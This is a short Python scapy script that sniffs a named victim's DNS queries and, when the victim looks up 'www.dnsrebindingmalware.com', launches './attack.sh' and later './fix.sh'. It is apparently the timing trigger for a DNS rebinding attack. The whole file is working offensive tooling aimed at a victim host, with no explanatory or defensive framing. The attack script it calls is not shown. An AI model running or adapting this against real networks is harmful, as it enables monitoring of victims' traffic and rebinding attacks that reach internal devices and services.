import sys, subprocess, time
from scapy.all import *

victim = ''

def select_dns_from_victim(pkt):
    global victim
    if DNS in pkt and b'www.dnsrebindingmalware.com' in pkt[DNS].qd.qname and pkt[IP].src == victim:
        print('Calling attack script...')
        subprocess.call("./attack.sh")
        print('Done!')
        time.sleep(10)
        print('Calling fix script...')
        subprocess.call("./fix.sh")
        print('Done!')
        exit()

if __name__ == '__main__': 
    if len(sys.argv) < 2:
        print('Please provide the IP address of the victim')
        exit()
    victim = sys.argv[1]
    print('Starting sniffer...')
    pkt = sniff(filter='udp and (src host ' + victim + ' and dst port 53)', prn=select_dns_from_victim)